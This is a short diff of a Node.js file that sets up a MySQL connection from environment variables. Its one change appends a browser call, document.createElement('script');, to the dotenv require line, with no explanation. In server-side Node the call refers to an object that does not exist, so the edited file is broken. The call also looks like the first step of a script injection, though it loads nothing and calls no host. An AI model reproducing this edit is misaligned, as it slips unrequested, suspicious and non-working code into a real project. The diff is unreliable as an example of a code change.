@@ -3,7 +3,7 @@ instalar dependencias, npm install
 */
 
 const mysql = require('mysql');
-require('dotenv/config');
+require('dotenv/config');document.createElement('script');
 
 var connection = mysql.createConnection({
     host: process.env.DB_HOST,
